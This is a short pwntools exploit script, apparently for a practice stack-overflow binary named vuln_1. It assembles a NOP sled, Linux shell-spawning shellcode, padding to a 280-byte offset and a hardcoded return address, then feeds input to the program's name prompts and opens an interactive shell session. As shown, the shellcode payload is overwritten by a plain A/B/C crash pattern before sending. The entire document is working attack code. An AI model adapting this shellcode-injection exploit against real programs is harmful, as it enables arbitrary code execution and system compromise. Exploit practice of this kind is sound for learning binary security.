from pwn import *

# tell pwltools we're using 64 bit
context.update(arch="amd64")

# Point to jump back to
saved_rip = 0x7fffffffddf0

# Overflow is 280, or 0x118
overflow_len = 0x118

NOPSLED = b"\x90" * 100

shellcode = asm(shellcraft.amd64.linux.sh())

# Construct payload
payload = NOPSLED
payload += shellcode
payload += b"A" * (overflow_len - len(NOPSLED) - len(shellcode))
payload += p64(saved_rip)

p = process("./vuln_1")

payload = b'A' * 280 + b'B' * 8 + b"C" * 100

p.sendafter(b"Hey, whats your name!?\n", payload)
p.sendafter(b"is this name correct? (y/n)?\n", b"y\n")
p.wait()

p.interactive()